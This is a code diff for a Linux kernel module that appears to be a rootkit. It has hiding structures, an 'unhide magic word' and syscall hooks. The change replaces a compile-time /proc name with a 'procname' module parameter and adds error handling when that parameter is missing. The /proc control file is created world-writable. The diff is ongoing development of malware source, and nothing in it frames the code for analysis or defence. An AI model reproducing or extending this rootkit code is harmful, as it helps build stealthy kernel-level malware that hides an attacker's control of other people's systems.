@@ -35,9 +35,6 @@
 #ifndef MODNAME
 #pragma message "Missing \'MODNAME\' compilation directive. See Makefile."
 #endif
-#ifndef PROCNAME
-#error "Missing \'PROCNAME\' compilation directive. See Makefile."
-#endif
 
 #ifndef PRCTIMEOUT
 /**
@@ -71,6 +68,9 @@ static unsigned int op_lock;
 static DEFINE_MUTEX(prc_mtx);
 static DEFINE_SPINLOCK(elfbits_spin);
 static DEFINE_SPINLOCK(hiddenstr_spin);
+static char *procname;
+module_param(procname, charp, 0644);
+MODULE_PARM_DESC(procname, "/proc/<name>");
 
 /** gcc  - fuck 32 bits shit (for now!) */
 #ifndef __x86_64__
@@ -660,7 +660,7 @@ int kv_add_proc_interface(void) {
         return 0;
 
 try_reload:
-    rrProcFileEntry = proc_create(PROCNAME, 0666, NULL, &proc_file_fops);
+    rrProcFileEntry = proc_create(procname, 0666, NULL, &proc_file_fops);
     if(lock && !rrProcFileEntry)
         goto proc_file_error;
     if(!lock) {
@@ -694,7 +694,7 @@ proc_file_error:
     prinfo("Could not create proc file.\n");
     return 0;
 leave:
-    prinfo("/proc/%s loaded, timeout: %ds\n", PROCNAME, PRC_TIMEOUT);
+    prinfo("/proc/%s loaded, timeout: %ds\n", procname, PRC_TIMEOUT);
     return 1;
 }
 
@@ -707,12 +707,12 @@ static void _proc_rm_wrapper(void) {
     mutex_lock(&prc_mtx);
     if(rrProcFileEntry) {
 #if LINUX_VERSION_CODE < KERNEL_VERSION(3,9,0)
-        remove_proc_entry(PROCNAME, NULL);
+        remove_proc_entry(procname, NULL);
 #else
         proc_remove(rrProcFileEntry);
 #endif
         rrProcFileEntry = NULL;
-        prinfo("/proc/%s unloaded.\n", PROCNAME);
+        prinfo("/proc/%s unloaded.\n", procname);
     }
     mutex_unlock(&prc_mtx);
 }
@@ -747,6 +747,7 @@ static int _proc_watchdog(void *unused) {
 static void _unroll_init(void) {
     char *magik = get_unhide_magic_word();
 
+
     if (tsk_prc) {
         kthread_unpark(tsk_prc);
         kthread_stop(tsk_prc);
@@ -762,6 +763,11 @@ static int __init kv_init(void) {
 
     int rv = 0;
     char *tname, *magik;
+
+    if (!procname)
+        goto procname_missing;
+
+    prinfo("procname: %s\n", procname);
 
     if (!kv_pid_init(kv_kall_load_addr()))
         goto addr_error;
@@ -847,6 +853,10 @@ magic_word_error:
 sys_init_error:
     prerr("Could not load syscalls hooks\n");
     kfree(magik);
+    rv = -EFAULT;
+    goto leave;
+procname_missing:
+    prerr("Missing parameter \"procname\"\n");
     rv = -EFAULT;
 leave:
     return rv;
